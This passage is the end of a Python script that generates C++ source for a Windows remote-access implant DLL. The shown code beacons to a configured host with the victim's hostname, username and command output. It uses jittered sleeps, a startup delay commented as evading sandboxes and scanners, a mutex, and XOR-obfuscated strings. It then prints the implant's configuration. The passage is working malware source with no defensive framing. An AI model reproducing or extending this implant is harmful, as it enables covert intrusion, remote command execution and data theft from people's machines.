                json = "{{\\"" + std::string(fguid) + "\\":\\"" + std::string(guid) + "\\",\\"" + std::string(fh) + "\\":\\"" + std::string(hostname) + "\\",\\"" + std::string(fu) + "\\":\\"" + std::string(username) + "\\",\\"" + std::string(fr) + "\\":\\"" + out_b64 + "\\",\\"" + std::string(fs) + "\\":\\"" + std::to_string(cmd_seq) + "\\"}}";
                _http_json(host, path, json);
            }}
        }} else {{
            fail_count++;
        }}
        int sleep_sec = {BEACON_BASE} + (rand() % {BEACON_JIT});
        if(fail_count > 3) sleep_sec *= 2;
        if(fail_count > 6) sleep_sec *= 2;
        if(fail_count > 10) sleep_sec = MAX_BACKOFF_SEC;
        if(sleep_sec > MAX_BACKOFF_SEC) sleep_sec = MAX_BACKOFF_SEC;
        _sleep_obf(sleep_sec * 1000);
    }}
    return 0;
}}

// Export for rundll32.exe
extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow) {{
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());

    // Startup delay to evade sandbox / on-access scanner
    _sleep_obf({STARTUP_MIN} * 1000 + (rand() % 30000));

    if(!_resolve_apis()) return;
    _api.f_CoInitialize(NULL);

    char mn[64]; s_copy(mn, _e_mutexname, sizeof(_e_mutexname));
    HANDLE hMutex = CreateMutexA(NULL, FALSE, mn);
    if(GetLastError() == ERROR_ALREADY_EXISTS) return;

    // Keep DLL loaded after rundll32 returns
    HMODULE hSelf = NULL;
    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCSTR)Run, &hSelf);

    _log("agent dll started");
    HANDLE hThread = CreateThread(NULL, 0, _bl, NULL, 0, NULL);
    if(hThread) {{ WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); }}
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }}
    return TRUE;
}}
'''

with open('agent_dll.cpp', 'w', encoding='utf-8', newline='\n') as f:
    f.write(cpp)

print('agent_dll.cpp generated')
print(f'  XOR key: {XOR_KEY}')
print(f'  Host: {host}:{port}')
print(f'  Mutex: {MUTEX_NAME}')
print(f'  Log: {LOG_NAME}')
print(f'  Startup delay: {STARTUP_MIN}s')
print(f'  Beacon: {BEACON_BASE}s +/- {BEACON_JIT}s')
print(f'  Upload: {UPLOAD_BASE}ms +/- {UPLOAD_JIT}ms')
